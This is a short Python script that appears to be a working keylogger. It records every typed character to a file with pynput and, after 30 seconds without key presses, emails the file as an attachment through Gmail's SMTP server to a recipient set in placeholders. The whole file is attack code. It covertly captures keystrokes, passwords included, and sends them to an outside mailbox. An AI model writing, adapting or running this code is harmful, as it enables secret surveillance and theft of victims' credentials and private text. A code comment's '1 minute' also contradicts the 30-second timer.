from pynput import keyboard
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Define a global variable to store the time of the last key press event
last_press_time = time.time()

# send mail function
def send_email(subject, from_email, to_email, password):

    # Create message object
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    # Open the text file and read its contents
    with open('keys.txt', 'rb') as f:
        file_data = f.read()

    # Attach the text file to the email message
    attachment = MIMEApplication(file_data, Name='keys.txt')
    attachment['Content-Disposition'] = f'attachment; filename="keys.txt"'
    msg.attach(attachment)


    # Connect to the SMTP server and send the message
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(from_email,password)
        smtp.sendmail(from_email, to_email, msg.as_string())
        smtp.quit()

    print('Email with attachment sent successfully after 30 seconds!')

# Define a function to handle key press events
def on_press(key):
    global last_press_time
    last_press_time = time.time()
    try:
        with open("keys.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        if key == keyboard.Key.enter:
            with open("keys.txt", "a") as f:
                f.write("\n")


if __name__ == '__main__':
    # Create a keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Run an infinite loop to check if no key has been pressed for 1 minute
    while True:
        if time.time() - last_press_time > 30:
            subject = "Email with attachment"
            from_email = "your_email_goes_here"
            to_email = "receiver_email_goes_here"
            password = "your_email_password_goes_here"
            send_email(subject, from_email, to_email, password)
            break
        time.sleep(1)